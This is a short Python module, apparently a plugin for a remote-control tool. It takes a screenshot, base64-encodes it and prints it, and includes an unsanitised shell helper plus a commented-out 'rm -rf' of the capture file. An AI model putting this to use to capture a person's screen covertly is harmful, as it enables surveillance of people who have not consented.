# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

import subprocess
import mss
from base64 import b64encode
import random

def run_command(command):
    out, err = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
    return out + err


def run(options):
    OUTPUT_FILE = f"screenshot{random.randint(0,100)}.jpg"
    with mss.mss() as sct:
        sct.shot(output=OUTPUT_FILE)
    with open(OUTPUT_FILE,'rb') as f:
        data = f.read()
        f.close()
    raw_data = b64encode(data)

    print(raw_data)
    # run_command("rm -rf " + OUTPUT_FILE)
